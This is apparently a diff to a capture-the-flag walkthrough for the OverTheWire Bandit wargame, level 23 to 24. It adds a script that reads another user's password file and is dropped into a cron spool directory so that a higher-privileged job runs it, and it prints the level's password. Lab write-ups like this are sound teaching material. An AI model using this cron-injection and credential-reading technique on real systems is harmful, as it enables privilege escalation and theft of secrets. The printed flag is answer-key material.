@@ -316,8 +316,7 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ## 23
 
 ```
-cd /etc/cron.d
-vi cronjob_bandit24
+vi /etc/cron.d/cronjob_bandit24
 vi /usr/bin/cronjob_bandit24.sh
 ```
 
@@ -344,7 +343,7 @@ do
 done
 ```
 
-It is executing all scripts in `/var/spool/bandit24` owned by `bandit23`.
+It is executing all scripts in `/var/spool/bandit24/foo` owned by `bandit23`.
 
 ```
 cd /var/spool/
@@ -359,3 +358,22 @@ It may be helpful to work in a temp directory so we can copy the script since it
 cd $(mktemp -d)
 ```
 
+In the temp directory, I made a `solve.sh` script:
+
+```
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24-pass-20251028
+```
+
+Importantly, the temp file you write to must be in `/tmp` not in the temp directory you made, since the temp directory you made is
+restricted to user bandit23.
+
+```
+chmod +x solve.sh
+cp solve.sh /var/spool/bandit24/foo/
+cat /tmp/bandit24-pass-20251028
+```
+
+`bandit24: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
+
+ 
